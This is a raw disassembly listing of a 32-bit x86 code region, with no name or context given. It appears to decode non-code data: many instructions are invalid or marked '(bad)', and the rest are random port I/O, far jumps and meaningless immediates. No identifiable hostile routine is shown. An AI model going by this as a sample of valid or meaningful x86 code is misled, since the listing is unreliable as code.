  41f261:	out    dx,al
  41f262:	and    al,0x63
  41f264:	fistp  QWORD PTR [ebp-0x25]
  41f267:	scas   al,BYTE PTR es:[edi]
  41f268:	push   ebp
  41f269:	xchg   DWORD PTR [edi],eax
  41f26b:	jp     0x41f1f3
  41f26d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f26e:	int    0xad
  41f270:	cs jnp 0x41f223
  41f273:	aad    0x57
  41f275:	inc    edx
  41f276:	pop    es
  41f277:	jo     0x41f26c
  41f279:	inc    ecx
  41f27a:	xchg   esp,eax
  41f27b:	scas   al,BYTE PTR es:[edi]
  41f27c:	fisttp QWORD PTR [edi-0x7d]
  41f27f:	jo     0x41f2d0
  41f281:	fstp   DWORD PTR [ecx+0x5b]
  41f284:	retf   0xc798
  41f287:	dec    ebp
  41f288:	in     eax,dx
  41f289:	adc    ch,BYTE PTR [ebp+0x44]
  41f28c:	outs   dx,DWORD PTR ds:[esi]
  41f28d:	sub    DWORD PTR [esi-0x65],0xef0d8d4d
  41f294:	jo     0x41f27e
  41f296:	and    eax,0xe79c95b6
  41f29b:	dec    ebp
  41f29c:	mov    al,ds:0xa3280478
  41f2a1:	in     al,0xec
  41f2a3:	lsl    ebx,WORD PTR [edi-0x2f]
  41f2a7:	push   0xb2cb1ce0
  41f2ac:	mov    cl,0xa6
  41f2ae:	lds    ebx,FWORD PTR [ebx]
  41f2b0:	jp     0x41f2fb
  41f2b2:	push   edx
  41f2b3:	xchg   ebp,eax
  41f2b4:	mov    ebx,0x52d28e07
  41f2b9:	cmp    ebx,DWORD PTR [edx-0x6d]
  41f2bc:	pusha  
  41f2bd:	mov    ah,0x39
  41f2bf:	mov    bl,0x2c
  41f2c1:	sub    al,0x57
  41f2c3:	push   ss
  41f2c4:	adc    eax,0x78a28253
  41f2c9:	dec    edx
  41f2ca:	inc    DWORD PTR [edi]
  41f2cc:	lods   eax,DWORD PTR ds:[esi]
  41f2cd:	mov    edx,0x80c88c64
  41f2d2:	cmp    al,0xbb
  41f2d4:	sub    eax,0xf5d66ee9
  41f2d9:	xlat   BYTE PTR ds:[ebx]
  41f2da:	mov    edx,0x30021059
  41f2df:	outs   dx,DWORD PTR ds:[esi]
  41f2e0:	mov    eax,ds:0xf713c515
  41f2e5:	xchg   edi,eax
  41f2e6:	mov    WORD PTR [ecx],ss
  41f2e8:	push   ss
  41f2e9:	xor    eax,0xcb57053e
  41f2ee:	cmp    BYTE PTR [ebp+eax*1+0x2be2fc44],ah
  41f2f5:	adc    eax,0x274d7753
  41f2fa:	out    0xc5,al
  41f2fc:	std    
  41f2fd:	mov    edi,esp
  41f2ff:	cld    
  41f300:	je     0x41f2aa
  41f302:	je     0x41f345
  41f304:	ret    
  41f305:	sub    al,0x95
  41f307:	les    ebp,FWORD PTR [esi+0x67]
  41f30a:	jmp    0x3bc7:0xd6e52a04
  41f311:	aam    0xe3
  41f313:	aad    0x74
  41f315:	loop   0x41f2ff
  41f317:	sub    al,dh
  41f319:	push   0xa7af15c9
  41f31e:	mov    ds:0xa45ce786,al
  41f323:	push   edx
  41f324:	(bad)  
  41f325:	cwde   
  41f326:	add    ch,BYTE PTR [ebp-0x2cc62562]
  41f32c:	das    
  41f32d:	dec    esp
  41f32e:	retf   0x837c
  41f331:	rcl    DWORD PTR [ecx+0x33d6d1ae],1
  41f337:	inc    esp
  41f338:	test   al,0xd5
  41f33a:	pop    DWORD PTR [ebp+esi*2+0x6f57677f]
  41f341:	es mov esp,0x26993356
  41f347:	mov    WORD PTR [ecx+0x0],cs
  41f34a:	pushf  
  41f34b:	dec    esp
  41f34c:	test   BYTE PTR [edi+0x52],ch
  41f34f:	sub    DWORD PTR [ebx+0x1a672abe],esi
  41f355:	add    edi,DWORD PTR [edx+eiz*2-0x5d]
  41f359:	lea    ecx,[ebp+0x2f]
  41f35c:	pop    ds
  41f35d:	sbb    DWORD PTR [edi+0x32fcc7c9],esp
  41f363:	repnz in al,dx
  41f365:	and    ebx,DWORD PTR [ebx+0x7d]
  41f368:	(bad)  
  41f369:	in     eax,dx
  41f36a:	sub    al,0x9f
  41f36c:	pop    ecx
  41f36d:	test   al,0xa
  41f36f:	aas    
  41f370:	loope  0x41f394
  41f372:	nop
  41f373:	add    cl,bl
  41f375:	into   
  41f376:	push   cs
  41f377:	lahf   
  41f378:	add    DWORD PTR [edx-0x38],esp
  41f37b:	jge    0x41f316
  41f37d:	dec    esi
  41f37e:	mov    WORD PTR [edx+0x59],es
  41f381:	mov    esi,0x1aa9f013
  41f386:	out    dx,eax
  41f387:	repnz inc ebp
  41f389:	xchg   esp,eax
  41f38a:	enter  0x36ae,0x45
  41f38e:	or     BYTE PTR [edi+ebp*2],0x3f
  41f392:	lahf   
  41f393:	or     al,0x97
  41f395:	pusha  
  41f396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f397:	add    DWORD PTR [ebx],esi
  41f399:	xor    al,0x8f
  41f39c:	sub    ah,BYTE PTR [ebx-0xfb0819b]
  41f3a2:	pop    es
  41f3a3:	push   eax
  41f3a4:	mov    ch,0x16
  41f3a6:	mov    ebp,0x67b7525f
  41f3ab:	add    al,0x18
  41f3ad:	xchg   esi,eax
  41f3ae:	fld    st(7)
  41f3b0:	(bad)  
  41f3b1:	daa    
  41f3b2:	rcr    DWORD PTR [edi+0x49],cl
  41f3b5:	lds    edi,FWORD PTR [esi-0x1c5c6596]
  41f3bb:	pop    edi
  41f3bc:	loope  0x41f340
  41f3be:	mov    dh,0x45
  41f3c0:	daa    
  41f3c1:	test   BYTE PTR [ecx],dh
  41f3c3:	in     al,0xa
  41f3c5:	call   0x4e4e:0x2db42ab7
  41f3cc:	aaa    
  41f3cd:	push   esi
  41f3ce:	repz js 0x41f412
  41f3d1:	in     al,dx
  41f3d2:	sub    eax,0xedd3ab9c
  41f3d7:	jp     0x41f416
  41f3d9:	shl    DWORD PTR [edi-0xa],1
  41f3dc:	call   0x4abb:0x11ae20d6
  41f3e3:	and    al,0xc9
  41f3e5:	mov    ds:0x41a835a5,eax
  41f3ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3eb:	push   eax
  41f3ec:	sbb    bl,cl
  41f3ee:	repz lahf 
  41f3f0:	jp     0x41f3e8
  41f3f2:	inc    edx
  41f3f3:	mov    ecx,gs
  41f3f5:	mov    ah,BYTE PTR ds:0xf4afd2c0
  41f3fb:	in     eax,0x5a
  41f3fd:	inc    edi
  41f3fe:	cdq    
  41f3ff:	sub    esp,ebp
  41f401:	jnp    0x41f3f4
  41f403:	xor    eax,0x742deee9
  41f408:	pop    es
  41f409:	adc    ch,cl
  41f40b:	shl    dh,1
  41f40d:	arpl   WORD PTR [eax+0x3d],sp
  41f410:	ret    
  41f411:	(bad)  
  41f412:	arpl   cx,dx
  41f414:	ja     0x41f398
  41f416:	xor    bl,BYTE PTR [eax+0x6d25c570]
  41f41c:	sub    eax,esi
  41f41e:	fmulp  st(5),st
  41f420:	int    0x12
  41f422:	pop    esp
  41f423:	fld    st(2)
  41f425:	and    dl,ch
  41f427:	cld    
  41f428:	scas   al,BYTE PTR es:[edi]
  41f429:	hlt    
  41f42a:	mov    ds:0x3966a38,al
  41f42f:	(bad)  
  41f430:	(bad)  
  41f431:	mov    ebp,0xdb4ef67b
  41f436:	out    0xc3,eax
  41f438:	mov    ds:0xc497fee3,al
  41f43d:	add    DWORD PTR [eax],eax
  41f43f:	call   0x4541f445
  41f444:	xchg   ecx,eax
  41f445:	cmp    DWORD PTR [ebx+0x9e12e35],esi
  41f44b:	lds    ebx,FWORD PTR [eax]
  41f44d:	dec    edi
  41f44e:	hlt    
  41f44f:	in     al,0x3b
  41f451:	pop    eax
  41f452:	adc    bl,0xe4
  41f455:	hlt    
  41f456:	in     al,0x5b
  41f458:	les    esp,FWORD PTR [esi]
  41f45a:	and    ah,BYTE PTR [ebp-0x72de906b]
  41f460:	pop    eax
  41f461:	mov    ebx,0xa1e600c3
  41f466:	fs push esi
  41f468:	xchg   edx,eax
  41f469:	xchg   ebx,eax
  41f46a:	and    ebp,DWORD PTR [eax]
  41f46c:	sbb    al,0xe8
  41f46e:	test   ebp,edi
  41f470:	(bad)
  41f473:	or     al,BYTE PTR [ecx+ebp*4]
  41f476:	mov    ds:0x511fef0f,al
  41f47b:	imul   edi,DWORD PTR [eax+edi*2+0x57],0xffffffd2
  41f480:	enter  0x7ac3,0x9b
  41f484:	les    esi,FWORD PTR [esi-0x56]
  41f487:	das    
  41f488:	cwd    
  41f48a:	mov    ah,0xd3
  41f48c:	fmul   QWORD PTR [edi-0x49010f8e]
  41f492:	push   edi
  41f493:	fwait
  41f494:	lahf   
  41f495:	mov    esi,0x9749520b
  41f49a:	lods   eax,DWORD PTR ds:[esi]
  41f49b:	dec    edx
  41f49c:	jb     0x41f51d
  41f49e:	jmp    0x4dec:0x2bf98678
  41f4a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4a6:	imul   ebx,DWORD PTR [edi+0x64],0xe3bfa0f2
  41f4ad:	jbe    0x41f464
  41f4af:	add    eax,0x3403116f
  41f4b4:	sahf   
  41f4b5:	scas   eax,DWORD PTR es:[edi]
  41f4b6:	loop   0x41f530
  41f4b8:	lods   eax,DWORD PTR ds:[esi]
  41f4b9:	push   es
  41f4ba:	lods   eax,DWORD PTR ds:[esi]
  41f4bb:	mov    al,ds:0x6edf0c55
  41f4c0:	xchg   esp,eax
  41f4c1:	mov    ch,0xe3
  41f4c3:	loope  0x41f4b5
  41f4c5:	or     DWORD PTR [ebx],edi
  41f4c7:	or     DWORD PTR [ecx+eax*4-0x613eeb60],edx
  41f4ce:	xchg   ebx,eax
  41f4cf:	out    dx,al
  41f4d0:	cmp    eax,0x9b108858
  41f4d5:	cmp    DWORD PTR [esi+0x38c046c2],esp
  41f4db:	ss fwait
  41f4dd:	inc    esp
  41f4de:	mov    DWORD PTR [edx+0x6e913e3f],eax
  41f4e4:	mul    DWORD PTR [esi+0x4]
  41f4e7:	xor    cl,al
  41f4e9:	jecxz  0x41f490
  41f4eb:	or     edx,DWORD PTR [ebx+edx*1+0x287d74da]
  41f4f2:	pushf  
  41f4f3:	(bad)  
  41f4f4:	mov    ch,0x64
  41f4f6:	and    al,BYTE PTR [esi-0x18]
  41f4f9:	sbb    al,0x7b
  41f4fb:	mov    edx,DWORD PTR [ecx]
  41f4fd:	shl    BYTE PTR [edi-0x36],0xae
  41f501:	mov    al,0xe4
  41f503:	pop    esp
  41f504:	dec    esi
  41f505:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f506:	adc    DWORD PTR [ebp+edx*2-0x101f8fa],0x22
  41f50e:	xchg   edi,eax
  41f50f:	sahf   
  41f510:	push   ss
  41f511:	jmp    0xefb6:0xbf5da01
  41f518:	inc    esp
  41f519:	pop    es
  41f51a:	mov    WORD PTR [edx+0x3b],gs
  41f51d:	dec    esi
  41f51e:	and    eax,0xc0491a76
  41f523:	out    dx,al
  41f524:	es mov eax,edi
  41f527:	test   BYTE PTR [eax],dl
  41f529:	mov    ah,0x32
  41f52b:	sar    BYTE PTR [eax+0x62a2db11],cl
  41f531:	add    ebx,DWORD PTR [edi+eiz*1]
  41f534:	jmp    0x41f4d7
  41f536:	mov    bl,0x83
  41f538:	aas    
  41f539:	clc    
  41f53a:	add    BYTE PTR [esi],dh
  41f53c:	sub    al,0x28
  41f53e:	stos   BYTE PTR es:[edi],al
  41f53f:	mov    ah,BYTE PTR [eax]
  41f541:	in     al,dx
  41f542:	xor    ebp,DWORD PTR [ecx-0x4e]
  41f545:	jge    0x41f50c
  41f547:	(bad)  
  41f548:	(bad)  
  41f549:	pop    esi
  41f54a:	sub    al,0x39
  41f54c:	das    
  41f54d:	dec    ecx
  41f54e:	imul   edi,DWORD PTR [ecx+ebx*2-0x3bb9b129],0x7b3737ee
  41f559:	jne    0x41f4f9
  41f55b:	xchg   ebx,eax
  41f55c:	fnstenv [edx-0x7ff5c97]
  41f562:	js     0x41f5d4
  41f564:	cmc    
  41f565:	mov    dl,0xa
  41f567:	mov    BYTE PTR [esi-0x630989ef],dl
  41f56d:	xchg   DWORD PTR [eax+0x49],ebx
  41f570:	add    al,0xb7
  41f572:	cmp    eax,0x3e5f9a31
  41f577:	cmc    
  41f578:	or     edi,DWORD PTR [edx]
  41f57a:	mov    al,ds:0xb1121aa5
  41f57f:	push   ds
  41f580:	jmp    0x3101126
  41f585:	arpl   WORD PTR [ebx-0x6d],dx
  41f588:	jl     0x41f574
  41f58a:	push   ecx
  41f58b:	(bad)  
  41f58c:	(bad)  
  41f58e:	mov    dl,0x52
  41f590:	(bad)  
  41f591:	in     eax,0x19
  41f593:	and    bl,ch
  41f595:	jl     0x41f59f
  41f597:	xor    al,BYTE PTR [edx]
  41f599:	in     al,0x91
  41f59b:	xor    al,0x4b
  41f59d:	in     eax,0x44
  41f59f:	sar    BYTE PTR [ebx+ecx*8+0x31],1
  41f5a3:	mov    dh,0xa2
  41f5a5:	or     DWORD PTR [esi],esi
  41f5a7:	inc    ecx
  41f5a8:	enter  0x4516,0x41
  41f5ac:	aas    
  41f5ad:	loope  0x41f5fe
  41f5af:	xor    al,0x47
  41f5b1:	jp     0x41f575
  41f5b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f5b4:	in     al,dx
  41f5b5:	popf   
  41f5b6:	aam    0xd1
  41f5b8:	push   es
  41f5b9:	fsubr  QWORD PTR [esi]
  41f5bb:	bound  esp,QWORD PTR ds:0x3617f5d6
  41f5c1:	enter  0x1add,0xd1
  41f5c5:	add    ch,cl
  41f5c7:	pop    ss
  41f5c8:	adc    eax,0x3b2a0ffc
  41f5cd:	add    al,0xdc
  41f5cf:	mov    esi,0x7be6cec9
  41f5d4:	lods   eax,DWORD PTR ds:[esi]
  41f5d5:	xchg   ebx,eax
  41f5d6:	and    edi,DWORD PTR [ebp+0x32]
  41f5d9:	icebp  
  41f5da:	push   0x70
  41f5dc:	mov    BYTE PTR [ebx+0x2bfdbd9e],ah
  41f5e2:	pop    es
  41f5e3:	in     al,dx
  41f5e4:	xor    DWORD PTR [eax+ebx*4-0x4018d2ef],esi
  41f5eb:	pop    edx
  41f5ec:	and    eax,0x10abd370
  41f5f1:	ds std 
  41f5f3:	dec    edi
  41f5f4:	pop    eax
  41f5f5:	aas    
  41f5f6:	jecxz  0x41f63a
  41f5f8:	push   ss
  41f5f9:	nop
  41f5fa:	and    eax,0x32949f50
  41f5ff:	xchg   edi,eax
  41f600:	mov    dl,0x16
  41f602:	sub    ch,BYTE PTR [ecx]
  41f604:	js     0x41f5b0
  41f606:	iret   
  41f607:	mov    dl,0xb9
  41f609:	mov    edi,0x93c698a9
  41f60e:	mov    eax,ds:0xe7ce0a3b
  41f613:	in     al,0xc6
  41f615:	xor    BYTE PTR [esi],dl
  41f617:	inc    eax
  41f618:	and    edi,esi
  41f61a:	retf   0x66a9
  41f61d:	add    DWORD PTR [edx+0x611b9a3f],0xe8badfbb
  41f627:	or     DWORD PTR cs:[edx+0x7ab9e93a],esi
  41f62e:	xor    BYTE PTR [edx-0xd],bh
  41f631:	jmp    0x41f62c
  41f633:	fimul  DWORD PTR [esp+eax*2+0x6c]
  41f637:	jmp    0x41f655
  41f639:	enter  0x7f55,0xc6
  41f63d:	add    DWORD PTR [eax],eax
  41f63f:	call   0x8a41f645
  41f644:	cmp    ah,BYTE PTR [esi+esi*1-0x5e]
  41f648:	fadd   QWORD PTR [edi]
  41f64a:	push   ebx
  41f64b:	fprem1 
  41f64d:	(bad)  
  41f64e:	pop    ebx
  41f64f:	mov    esi,0xc61cb1ff
  41f654:	mov    ds:0x7997491c,eax
  41f659:	xchg   ecx,eax
  41f65a:	adc    esp,DWORD PTR [edi]
  41f65c:	int3   
  41f65d:	sbb    bl,BYTE PTR [edx]
  41f65f:	scas   eax,DWORD PTR es:[edi]
  41f660:	sahf   
  41f661:	clc    
  41f662:	push   ecx
  41f664:	inc    edx
  41f665:	retf   0xd1a0
  41f668:	xchg   ebx,eax
  41f669:	(bad)  
  41f66a:	out    0xc3,eax
  41f66c:	inc    esp
  41f66d:	mov    eax,0x896b9b51
  41f672:	xchg   edx,eax
  41f673:	fadd   QWORD PTR [eax+0x3b]
  41f676:	(bad)
  41f67a:	cmp    DWORD PTR [edx-0x7d],ebp
  41f67d:	ins    DWORD PTR es:[edi],dx
  41f67e:	fiadd  WORD PTR cs:[edi-0x78]
  41f682:	loope  0x41f6b4
  41f684:	jnp    0x41f6cb
  41f686:	adc    al,0x64
  41f688:	pop    edi
  41f689:	mov    ch,0xe9
  41f68b:	jb     0x41f6f7
  41f68d:	mov    ah,0x3c
  41f68f:	rol    BYTE PTR [eax+0x62],0x7f
  41f693:	enter  0xb445,0x4d
  41f697:	in     eax,0x6c
  41f699:	pushf  
  41f69a:	shl    DWORD PTR [ebp+0x11],1
  41f69d:	push   edi
  41f69e:	lods   eax,DWORD PTR ds:[esi]
  41f69f:	dec    edx
  41f6a0:	leave  
  41f6a1:	fst    QWORD PTR [edx-0x3]
  41f6a4:	outs   dx,BYTE PTR ds:[esi]
  41f6a5:	or     al,0x16
  41f6a7:	fdiv   QWORD PTR [edi-0x78]
  41f6aa:	mov    eax,ds:0x1379a706
  41f6af:	adc    DWORD PTR [esi+0x13],0x7
  41f6b3:	shr    DWORD PTR [edx+ebx*4+0x2e],0xc0
  41f6b8:	hlt    
  41f6b9:	imul   ebp,ebp,0xffffffdb
  41f6bc:	mov    al,ds:0xfe95b528
  41f6c1:	adc    al,0x67
  41f6c3:	movntps XMMWORD PTR [ebp-0x7ca374ba],xmm0
  41f6ca:	inc    ebp
  41f6cb:	mov    ecx,0x9d1e2e31
  41f6d0:	sahf   
  41f6d1:	ds add DWORD PTR gs:[edi],esp
  41f6d5:	shl    DWORD PTR [ebx],1
  41f6d7:	xor    al,0xd6
  41f6d9:	or     eax,0xc110697
  41f6de:	sbb    edi,DWORD PTR [edx]
  41f6e0:	mov    ds:0xe9979511,eax
  41f6e5:	sub    ebp,DWORD PTR [ebp+0x38]
  41f6e8:	dec    BYTE PTR [edi-0x52]
  41f6eb:	(bad)  
  41f6ed:	cmp    al,0xdb
  41f6ef:	or     DWORD PTR [esi-0x49],ebx
  41f6f2:	cmp    DWORD PTR es:[edx+0x224c711c],edi
  41f6f9:	adc    dl,cl
  41f6fb:	jb     0x41f67d
  41f6fd:	push   ss
  41f6fe:	idiv   BYTE PTR [ebp+0x62a34aad]
  41f704:	inc    esp
  41f705:	sub    al,0xb8
  41f707:	mov    cl,0x8b
  41f709:	jb     0x41f6b6
  41f70b:	fcmove st,st(2)
  41f70d:	std    
  41f70e:	sti    
  41f70f:	retfw  0x3295
  41f713:	add    DWORD PTR [ecx-0x3466d470],esi
  41f719:	sbb    al,0x8
  41f71b:	in     eax,0x7e
  41f71d:	jmp    0x41f767
  41f71f:	rcr    ah,1
  41f721:	pop    es
  41f722:	cld    
  41f723:	add    eax,DWORD PTR [ebp+0x43eb766d]
  41f729:	or     DWORD PTR [edi-0x38210cf0],esp
  41f72f:	mov    eax,0x5a626e20
  41f734:	imul   edx,DWORD PTR [edx+0xebbc068],0xffffffe6
  41f73b:	test   al,0xcc
  41f73d:	rcr    eax,cl
  41f73f:	mov    eax,ds:0xdb9a1edf
  41f744:	sbb    al,0x1b
  41f746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f747:	sbb    al,0x10
  41f749:	aas    
  41f74a:	dec    DWORD PTR [eax]
  41f74c:	aam    0xb3
  41f74e:	mov    WORD PTR [edx-0x27],es
  41f751:	stmxcsr DWORD PTR [edx+ebx*1-0x76713486]
  41f759:	sti    
  41f75a:	hlt    
  41f75b:	sar    DWORD PTR [ebp+0x53],cl
  41f75e:	mov    BYTE PTR [edx-0x700999e8],ah
  41f764:	pop    ss
  41f765:	inc    ebp
  41f766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f767:	push   edx
  41f768:	in     eax,0x83
  41f76a:	sub    DWORD PTR [ebx+eax*1-0x2c],esi
  41f76e:	mov    ah,0x0
  41f770:	inc    edx
  41f771:	sbb    eax,0x4a16e3c4
  41f776:	sti    
  41f777:	aaa    
  41f778:	arpl   cx,si
  41f77a:	add    DWORD PTR [ecx],ebp
  41f77c:	mul    DWORD PTR [ebx-0x6bc2f856]
  41f782:	pop    ebp
  41f783:	add    al,0x73
  41f785:	pop    ecx
  41f787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f788:	mov    bh,BYTE PTR [esi]
  41f78a:	xchg   esi,eax
  41f78b:	in     al,dx
  41f78c:	mov    bl,0x11
  41f78e:	xor    ah,BYTE PTR [eax+0x23485be8]
  41f794:	or     BYTE PTR [esi+edx*2+0x19],ah
  41f798:	mov    BYTE PTR [edi],ah
  41f79a:	fwait
  41f79b:	dec    edi
  41f79c:	fnstsw WORD PTR [edi]
  41f79e:	ins    BYTE PTR es:[edi],dx
  41f79f:	mov    ebp,0x71264bd1
  41f7a4:	xlat   BYTE PTR ds:[ebx]
  41f7a5:	xchg   esi,eax
  41f7a6:	rep lods al,BYTE PTR ds:[esi]
  41f7a8:	and    eax,0x9e67d632
  41f7ad:	ret    0x9eb4
  41f7b0:	sti    
  41f7b1:	(bad)  
  41f7b2:	aaa    
  41f7b3:	sbb    esi,DWORD PTR [edx+ecx*4-0x39cbe2a6]
  41f7ba:	jmp    0xe7de:0x67b8ab80
  41f7c1:	ret    0x70
  41f7c4:	pop    edi
  41f7c5:	in     al,0x18
  41f7c7:	(bad)  
  41f7c8:	retf   
  41f7c9:	cwde   
  41f7ca:	out    dx,al
  41f7cb:	jnp    0x41f772
  41f7cd:	(bad)  
  41f7cf:	sbb    edi,esp
  41f7d1:	dec    edi
  41f7d2:	int3   
  41f7d3:	out    0x44,eax
  41f7d5:	outs   dx,BYTE PTR ds:[esi]
  41f7d6:	cmp    al,0xc9
  41f7d8:	push   ecx
  41f7d9:	loopne 0x41f7f0
  41f7db:	out    0xbe,al
  41f7dd:	int    0xc9
  41f7df:	dec    ecx
  41f7e0:	ds jl  0x41f7a5
  41f7e3:	jmp    0x41f791
  41f7e5:	test   DWORD PTR [esi+0x692aa21b],0xa279c638
  41f7ef:	sub    al,0x92
  41f7f1:	imul   ecx,DWORD PTR [eax],0x16
  41f7f4:	rcl    DWORD PTR [ecx+ebx*1-0x7b573002],cl
  41f7fb:	sub    BYTE PTR [esi],bh
  41f7fd:	push   esp
  41f7fe:	mov    WORD PTR [esi+0x10fdcffe],?
  41f804:	xchg   ebp,eax
  41f805:	stos   BYTE PTR es:[edi],al
  41f806:	in     al,dx
  41f807:	add    eax,0x8c84893f
  41f80c:	push   0xccc50f86
  41f811:	or     eax,0x14719774
  41f816:	js     0x41f806
  41f818:	mov    ch,0x51
  41f81a:	pushf  
  41f81b:	cmp    ebp,DWORD PTR [ebp-0x24]
  41f81e:	mov    eax,0x8c480a2e
  41f823:	sbb    eax,0x22fe0925
  41f828:	xchg   ebx,eax
  41f829:	ins    DWORD PTR es:[edi],dx
  41f82a:	adc    bl,BYTE PTR [ebx+0x41]
  41f82d:	pop    ebx
  41f82e:	iret   
  41f82f:	pop    ebx
  41f830:	(bad)  
  41f832:	aad    0xf
  41f834:	ss dec esp
  41f836:	dec    esi
  41f837:	jl     0x41f884
  41f839:	pop    ebx
  41f83a:	ret    0xc867
  41f83d:	add    DWORD PTR [eax],eax
  41f83f:	call   0x1441f845
  41f844:	lods   eax,DWORD PTR ds:[esi]
  41f845:	mov    BYTE PTR [edx],0xb7
  41f848:	fisttp DWORD PTR [ecx]
  41f84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f84b:	xchg   BYTE PTR [edi*2+0x5e1c4053],bl
  41f852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f853:	mov    ebx,0x26365b0b
  41f858:	popf   
  41f859:	in     eax,dx
  41f85a:	adc    BYTE PTR [ebp+0x67],ah
  41f85d:	ins    BYTE PTR es:[edi],dx
  41f85e:	fistp  QWORD PTR [ecx-0x7b]
  41f861:	aaa    
  41f862:	cwde   
  41f863:	stos   BYTE PTR es:[edi],al
  41f864:	imul   esp,DWORD PTR [ebp+eiz*1+0x55],0x68
  41f869:	push   es
  41f86a:	jg     0x41f863
  41f86c:	mov    ebx,0x2b0289d8
  41f871:	shl    BYTE PTR [ebx+0x25],0x31
  41f875:	rol    DWORD PTR fs:[ecx-0x6d31d0a],0x0
  41f87d:	pushf  
  41f87e:	int3   
  41f87f:	and    BYTE PTR [ebp-0x672b8f8d],bl
  41f885:	sub    dh,BYTE PTR [ebp+0x6241bda8]
  41f88b:	push   es
  41f88c:	out    dx,eax
  41f88d:	and    cl,BYTE PTR ss:[edi+eiz*4+0x106281d2]
  41f895:	fwait
  41f896:	test   eax,edi
  41f898:	cmp    esp,esp
  41f89a:	sti    
  41f89b:	jmp    0xc11f21d8
  41f8a0:	jno    0x41f871
  41f8a2:	loop   0x41f8fa
  41f8a4:	xchg   ebp,eax
  41f8a5:	out    dx,al
  41f8a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8a7:	adc    eax,0x40587a61
  41f8ac:	adc    edx,DWORD PTR es:[ebx+0x3b7a418b]
  41f8b3:	adc    al,0x13
  41f8b5:	jp     0x41f8d6
  41f8b7:	(bad)  
  41f8b8:	cli    
  41f8b9:	add    DWORD PTR [edi-0x1f4f12d],esp
  41f8bf:	lods   eax,DWORD PTR ds:[esi]
  41f8c0:	(bad)  
  41f8c1:	cmp    BYTE PTR [eax+eax*8-0x46],al
  41f8c5:	inc    esp
  41f8c6:	xchg   esp,eax
  41f8c7:	push   edi
  41f8c8:	xchg   edi,eax
  41f8c9:	mov    ah,dl
  41f8cb:	mov    WORD PTR [edx],?
  41f8cd:	add    BYTE PTR [eax],bh
  41f8cf:	add    eax,0xa23e2375
  41f8d4:	test   ebx,edx
  41f8d6:	shl    BYTE PTR [edx-0x20167983],cl
  41f8dc:	mov    edx,0x4b486ca0
  41f8e1:	stos   DWORD PTR es:[edi],eax
  41f8e2:	imul   ecx,esi,0xf31fa057
  41f8e8:	jp     0x41f8fe
  41f8ea:	or     al,0x5f
  41f8ec:	repz jbe 0x41f925
  41f8ef:	mov    edx,0x972f346a
  41f8f4:	pusha  
  41f8f5:	fldenv [ecx-0x1f3b320f]
  41f8fb:	loop   0x41f933
  41f8fd:	xor    BYTE PTR [edx],ah
  41f8ff:	jmp    0x42a20ff4
  41f904:	lods   eax,DWORD PTR ds:[esi]
  41f905:	mov    bh,0xf5
  41f907:	lods   eax,DWORD PTR ds:[esi]
  41f908:	ins    BYTE PTR es:[edi],dx
  41f909:	rol    BYTE PTR [esp],1
  41f90c:	sbb    al,0x6d
  41f90e:	rol    BYTE PTR [edx],cl
  41f910:	jo     0x41f93f
  41f912:	test   eax,0x757c7aa2
  41f917:	xor    BYTE PTR [edx],ch
  41f919:	dec    ebx
  41f91a:	iret   
  41f91b:	cmp    cl,ah
  41f91d:	ins    DWORD PTR es:[edi],dx
  41f91e:	jno    0x41f979
  41f920:	scas   al,BYTE PTR es:[edi]
  41f921:	add    eax,0x1880c40d
  41f926:	sub    bl,BYTE PTR [edx+0x1a]
  41f929:	push   ecx
  41f92a:	and    DWORD PTR [edi+0x3159ee0c],0xf2cd85b2
  41f934:	test   DWORD PTR [ecx+ebp*2],ebp
  41f937:	mov    edx,0xb9ed76d4
  41f93c:	sbb    eax,0x4b87bb4a
  41f941:	xor    al,0xf6
  41f943:	in     al,0xf5
  41f945:	mov    ds:0x3c1a8d3c,al
  41f94a:	cmp    eax,0x5a061889
  41f94f:	or     BYTE PTR [eax-0x1a78356e],ch
  41f955:	das    
  41f956:	lods   al,BYTE PTR ds:[esi]
  41f957:	mov    eax,0x94825d47
  41f95c:	not    bh
  41f95e:	mov    ebp,0xa83c07a8
  41f963:	or     dl,BYTE PTR [ebx]
  41f965:	fld    QWORD PTR [ecx]
  41f967:	int3   
  41f968:	pop    ds
  41f969:	int    0xec
  41f96b:	test   BYTE PTR ds:0xfc1356b6,al
  41f971:	mov    al,0xbf
  41f973:	pusha  
  41f974:	int3   
  41f975:	ja     0x41f990
  41f977:	sti    
  41f978:	mov    edx,0xa00ac200
  41f97d:	not    BYTE PTR ds:0xe298de1d
  41f983:	pop    ds
  41f984:	jmp    0x7e0a815f
  41f989:	(bad)  
  41f98a:	fidivr DWORD PTR [edi+0x4a80abdf]
  41f990:	popa   
  41f991:	shr    BYTE PTR [edx-0x7472b524],0x5b
  41f998:	mov    bh,0x51
  41f99a:	push   ss
  41f99b:	mov    ds:0x6a6ee597,eax
  41f9a0:	cmp    BYTE PTR [esi+0xfeff7d7],bh
  41f9a6:	call   0x59c9:0x70abcf3e
  41f9ad:	ja     0x41f95d
  41f9af:	add    al,0x20
  41f9b1:	mov    ds:0x63a5cfa5,al
  41f9b6:	shl    ch,cl
  41f9b8:	std    
  41f9b9:	test   DWORD PTR [ecx+0x28d964a2],0xc64b6273
  41f9c3:	sar    DWORD PTR [esi+0x51],cl
  41f9c6:	rcl    cl,1
  41f9c8:	fist   WORD PTR [eax+0x5e]
  41f9cb:	sahf   
  41f9cc:	inc    edi
  41f9cd:	std    
  41f9ce:	adc    BYTE PTR [ecx-0x467fbb45],ch
  41f9d4:	popa   
  41f9d5:	cmp    DWORD PTR [edx-0x7],ebp
  41f9d8:	xor    DWORD PTR [edx],0x8765b43c
  41f9de:	and    eax,0x48fa5e8b
  41f9e3:	aad    0x9c
  41f9e5:	pop    ecx
  41f9e6:	mov    ch,BYTE PTR [esi+0x2]
  41f9e9:	retf   
  41f9ea:	jb     0x41fa53
  41f9ec:	inc    ebp
